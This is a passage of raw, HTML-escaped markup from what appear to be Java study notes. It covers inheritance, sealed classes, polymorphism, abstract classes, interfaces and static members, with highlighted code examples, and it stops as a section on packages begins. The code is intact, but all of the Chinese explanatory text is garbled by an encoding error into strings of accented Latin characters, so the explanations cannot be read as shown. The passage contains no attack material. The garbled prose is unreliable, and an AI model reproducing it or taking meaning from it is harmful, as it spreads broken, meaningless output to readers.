&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>éæ„é€ æ–¹æ³•ä¹Ÿå¯æœ‰å¤šä¸ªé‡åçš„ï¼ˆå‚æ•°ä¸åŒ è¿”å›å€¼é€šå¸¸ç›¸åŒï¼‰ï¼Œç§°ä¸ºæ–¹æ³•é‡è½½(Overload)ï¼Œä¾¿äºç”¨ä¸€ä¸ªåå­—å¤„ç†å¤šç§å‚æ•°è¾“å…¥&lt;/li>
&lt;/ul>
&lt;h3 id="ç»§æ‰¿å¤šæ€">ç»§æ‰¿&amp;amp;å¤šæ€&lt;/h3>
&lt;ul>
&lt;li>ä½¿ç”¨&lt;code>extends&lt;/code>å…³é”®å­—ï¼Œä¾‹&lt;code>class Student extends Person&lt;/code>&lt;/li>
&lt;li>subclass == extended class; super class == parent class == base class&lt;/li>
&lt;li>å­ç±»ä¸å¯è®¿é—®çˆ¶ç±»çš„&lt;code>private&lt;/code>å­—æ®µå’Œæ–¹æ³•ï¼Œä¸èƒ½è¦†å†™çˆ¶ç±»å¸¦æœ‰&lt;code>final&lt;/code>å…³é”®å­—çš„æ–¹æ³•ï¼Œä¸èƒ½ç»§æ‰¿å¸¦æœ‰&lt;code>final&lt;/code>çš„ç±»ï¼Œä¸èƒ½é‡æ–°èµ‹å€¼å¸¦æœ‰&lt;code>final&lt;/code>çš„å­—æ®µ&lt;/li>
&lt;li>&lt;code>private&lt;/code>è®¿é—®æƒé™è¢«é™å®šåœ¨&lt;code>class&lt;/code>çš„å†…éƒ¨ï¼Œè€Œä¸”ä¸æ–¹æ³•å£°æ˜é¡ºåºæ— å…³ï¼›å¦‚æœä¸€ä¸ªç±»å†…éƒ¨è¿˜å®šä¹‰äº†nested classåµŒå¥—ç±»ï¼Œé‚£ä¹ˆï¼ŒåµŒå¥—ç±»æ‹¥æœ‰è®¿é—®&lt;code>private&lt;/code>çš„æƒé™&lt;/li>
&lt;li>å®šä¹‰ä¸º&lt;code>protected&lt;/code>çš„å­—æ®µå’Œæ–¹æ³•å¯ä»¥è¢«å­ç±»è®¿é—®ï¼Œä»¥åŠå­ç±»çš„å­ç±»&lt;/li>
&lt;li>ç»§æ‰¿ä¹‹å&lt;code>super.name&lt;/code>, &lt;code>this.name&lt;/code>, &lt;code>name&lt;/code>éƒ½æ˜¯ä¸€ä¸ªæ„æ€ï¼Œä½†å¦‚æœå­˜åœ¨æ–¹æ³•è¦†å†™åè°ƒç”¨çˆ¶ç±»æ–¹æ³•å°±å¿…é¡»ç”¨&lt;code>super.name&lt;/code>ï¼ˆè”æƒ³NodeJSçš„&lt;code>.call&lt;/code>, &lt;code>.apply&lt;/code> å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼‰&lt;/li>
&lt;li>æœªæ³¨æ˜&lt;code>extends xxx&lt;/code>çš„ç±»è‡ªåŠ¨è¢«è¡¥ä¸Šäº†&lt;code>extends Object&lt;/code>ï¼Œæœ€é¡¶å±‚çš„&lt;code>object&lt;/code>ä¹Ÿæ˜¯å¯ä»¥è¢«è¦†å†™çš„&lt;/li>
&lt;li>ä»»ä½•ç±»çš„æ„é€ æ–¹æ³•ä¸­ç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¦‚æœªæ³¨æ˜ä¼šè‡ªåŠ¨è¡¥ä¸Š&lt;code>super();&lt;/code>ï¼Œæ‰€ä»¥å¦‚æœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨&lt;code>super()&lt;/code>å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æ„é€ æ–¹æ³•â€”â€”â€”â€”ä¸€å¥è¯ï¼šå­ç±»ä¸ç»§æ‰¿çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼ˆè”æƒ³Nodejsæ‰§è¡Œä»£ç æ—¶çš„wrapperï¼‰&lt;/li>
&lt;li>Java15ä¹‹åå…è®¸&lt;code>sealed&lt;/code>ä¿®é¥°classï¼Œå¹¶å¯é€šè¿‡&lt;code>permits&lt;/code>é™åˆ¶èƒ½ä»è¯¥ç±»ç»§æ‰¿çš„å­ç±»åç§°ï¼ˆç›®å‰ä¸ºé¢„è§ˆçŠ¶æ€ï¼Œå¯å¼€å¯&lt;code>--enable-preview&lt;/code>å’Œ&lt;code>--source 15&lt;/code>å¼€å¯ï¼‰&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">sealed&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Shape&lt;/span> &lt;span style="color:#111">permits&lt;/span> &lt;span style="color:#111">Rect&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Circle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Triangle&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// xxx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å‘ä¸Šè½¬å‹åŸºæœ¬æ— é—®é¢˜ï¼Œå‘ä¸‹å¯èƒ½å›æŠ¥ClassCastExceptionçš„é”™è¯¯ï¼Œç”¨&lt;code>instanceof&lt;/code>åˆ¤æ–­ä¸€ä¸ªå®ä¾‹ç©¶ç«Ÿæ˜¯ä¸æ˜¯æŸç§ç±»å‹&lt;/li>
&lt;li>å­ç±»ä¸çˆ¶ç±»æ–¹æ³•ç­¾åå®Œå…¨ç›¸åŒæ—¶å¯è¦†å†™(Override)ï¼ŒåŠ ä¸Š&lt;code>@Override&lt;/code>å¯ä»¥è®©ç¼–è¯‘å™¨å¸®åŠ©æ£€æŸ¥æ˜¯å¦è¿›è¡Œäº†æ­£ç¡®çš„è¦†å†™ï¼ˆéå¿…è¦ï¼‰&lt;/li>
&lt;li>newæ¥çš„å¯¹è±¡å¦‚æœæŒ‡å®šçš„ç±»å‹ä¸åŒï¼Œå®é™…è°ƒç”¨å…¶æ–¹æ³•æ—¶ä¼šä¸åŒï¼Œrunèµ·æ¥æ‰çŸ¥é“å…·ä½“ç”¨çš„å•¥ï¼Œè¿™ä¸ªå«å¤šæ€(Polymorphic)ï¼Œæœ‰åŠ©äºå®ç°åŠŸèƒ½æ‹“å±•ï¼Œå°è£…åº•å±‚é€»è¾‘ ä¼˜åŒ–äº¤äº’&lt;/li>
&lt;/ul>
&lt;h3 id="æŠ½è±¡ç±»æ¥å£">æŠ½è±¡ç±»&amp;amp;æ¥å£&lt;/h3>
&lt;ul>
&lt;li>æŠ½è±¡ç±»ä¸å®ç°ä»»ä½•åŠŸèƒ½ ä»…ä¸ºäº†å®šä¹‰æ–¹æ³•ç­¾åï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è®©å­ç±»ç»§æ‰¿å¹¶è¦†ç›–ï¼Œæ³¨æ„è¿™ä¸ªç±»æœ¬èº«ä¹Ÿè¦å£°æ˜ä¸º&lt;code>abstract&lt;/code>ä½œæŠ½è±¡ç±»&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// æ— å­å¥
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡ç±»å’ŒNä¸ªå…·ä½“ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ½è±¡ç±»ä½œå¼•ç”¨ç±»å‹å»å¼•ç”¨å…·ä½“ç±»çš„å­ç±»å®ä¾‹ï¼Œå¥½å¤„åœ¨äºå¯¹å®ä¾‹çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨æ—¶å¹¶ä¸å…³å¿ƒæŠ½è±¡ç±»å‹å˜é‡çš„å…·ä½“å­ç±»å‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Teacher&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ä¸å…³å¿ƒPersonå˜é‡çš„å…·ä½“å­ç±»å‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åŒæ ·ä¸å…³å¿ƒæ–°çš„å­ç±»æ˜¯å¦‚ä½•å®ç°run()æ–¹æ³•çš„ï¼š
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Employee&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ç§å°½é‡å¼•ç”¨é«˜å±‚ç±»å‹ï¼Œé¿å…å¼•ç”¨å®é™…å­ç±»å‹çš„æ–¹å¼ï¼Œç§°ä¹‹ä¸ºé¢å‘æŠ½è±¡ç¼–ç¨‹ï¼Œæœ¬è´¨ï¼š&lt;/p>
&lt;p>ä¸Šå±‚ä»£ç åªå®šä¹‰è§„èŒƒ(&lt;code>abstract class Person&lt;/code>)ï¼Œä¸éœ€è¦å­ç±»å°±å¯ä»¥å®ç°ä¸šåŠ¡é€»è¾‘ï¼ˆæ­£å¸¸ç¼–è¯‘ï¼‰ï¼Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘ç”±ä¸åŒçš„å­ç±»å®ç°ï¼Œè°ƒç”¨è€…å¹¶ä¸å…³å¿ƒ&lt;/p>
&lt;ul>
&lt;li>&lt;code>interface&lt;/code>æ¯”æŠ½è±¡ç±»è¿˜æŠ½è±¡çš„çº¯æŠ½è±¡æ¥å£ï¼Œæ— å®ä¾‹å­—æ®µï¼Œæ‰€æœ‰æ–¹æ³•éƒ½é»˜è®¤&lt;code>public abstract&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å½“å…·ä½“ç±»å®ç°ä¸€ä¸ªæ¥å£æ—¶éœ€è¦ç”¨&lt;code>implements&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; run&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œä¸€ä¸ªæ¥å£ä¹Ÿå¯ä»¥ç»§æ‰¿è‡ªå¦ä¸€ä¸ªæ¥å£&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// å®ç°äº†ä¸¤ä¸ªinterface
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// ç»§æ‰¿å¦ä¸€ä¸ªæ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åœ¨æ¥å£ä¸­ï¼Œå¯ä»¥å®šä¹‰&lt;code>default&lt;/code>æ–¹æ³•ï¼›&lt;code>default&lt;/code>æ–¹æ³•å’ŒæŠ½è±¡ç±»çš„æ™®é€šæ–¹æ³•æ˜¯æœ‰æ‰€ä¸åŒçš„ã€‚å› ä¸º&lt;code>interface&lt;/code>æ²¡æœ‰å­—æ®µï¼Œ&lt;code>default&lt;/code>æ–¹æ³•æ— æ³•è®¿é—®å­—æ®µï¼Œè€ŒæŠ½è±¡ç±»çš„æ™®é€šæ–¹æ³•å¯ä»¥è®¿é—®å®ä¾‹å­—æ®µ(Java&amp;gt;=1.8)&lt;/li>
&lt;/ul>
&lt;h3 id="é™æ€å­—æ®µé™æ€æ–¹æ³•">é™æ€å­—æ®µ&amp;amp;é™æ€æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç”¨&lt;code>static&lt;/code>å…³é”®å­—ä¿®é¥°çš„å­—æ®µå¤„äºåŒä¸€ä¸ªå…±äº«ä½œç”¨åŸŸä¸­&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸æ¨èç”¨&lt;code>å®ä¾‹.é™æ€å­—æ®µ&lt;/code>å»è®¿é—®é™æ€å­—æ®µï¼Œå› ä¸ºåœ¨javaä¸­å®ä¾‹å¯¹è±¡å¹¶æ²¡æœ‰é™æ€å­—æ®µ(å®é™…)ï¼Œä»£ç ä¸­å¯ä»¥è®¿é—®æ˜¯å› ä¸ºç¼–è¯‘å™¨å¯ä»¥æ ¹æ®å®ä¾‹ç±»å‹è‡ªåŠ¨è½¬æ¢ä¸º&lt;code>ç±»å.é™æ€å­—æ®µ&lt;/code>æ¥è®¿é—®&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ¨èç”¨ç±»åæ¥è®¿é—®é™æ€å­—æ®µï¼Œå¯ä»¥å°†å…¶ç†è§£ä¸ºç±»æœ¬èº«çš„å­—æ®µ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒç”¨å®ä¾‹æ–¹æ³•å¿…é¡»é€šè¿‡ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œè€Œè°ƒç”¨é™æ€æ–¹æ³•åˆ™ä¸éœ€è¦å®ä¾‹å˜é‡ï¼Œé€šè¿‡ç±»åå°±å¯ä»¥è°ƒç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">number&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">number&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™æ€æ–¹æ³•å†…éƒ¨æ— æ³•è®¿é—®&lt;code>this&lt;/code>ï¼Œä¹Ÿæ— æ³•è®¿é—®å®ä¾‹å­—æ®µï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µ&lt;/li>
&lt;li>é™æ€æ–¹æ³•å¸¸ç”¨äºå·¥å…·ç±»ï¼Œæ¯”å¦‚&lt;code>Arrays.sort()&lt;/code>å’Œ&lt;code>Math.random()&lt;/code>ï¼›javaç¨‹åºå…¥å£çš„&lt;code>main&lt;/code>ä¹Ÿæ˜¯é™æ€æ–¹æ³•å™¢&lt;/li>
&lt;li>å¯¹äºæ¥å£è€Œè¨€è™½ç„¶ä¸èƒ½æœ‰å®ä¾‹å­—æ®µï¼Œä½†æ˜¯å¯ä»¥æœ‰&lt;code>public static final&lt;/code>åŠ æŒçš„é™æ€å­—æ®µ&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>public interface Person {
public static final int MALE = 1;
public static final int FEMALE = 2;
}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å¯ç®€å†™
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Špublic statc final:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">MALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">FEMALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="åŒ…">åŒ…&lt;/h3>
&lt;ul>
&lt;li>ä½¿ç”¨packageåŒ…æ¥è§£å†³åå­—å†²çªï¼ˆå„ä¸ªè¯­è¨€éƒ½æœ‰äº† å¾ˆå¥½æ‡‚ï¼‰ï¼Œå¯ä»¥ç”¨ç±»çš„å…¨å&lt;/li>
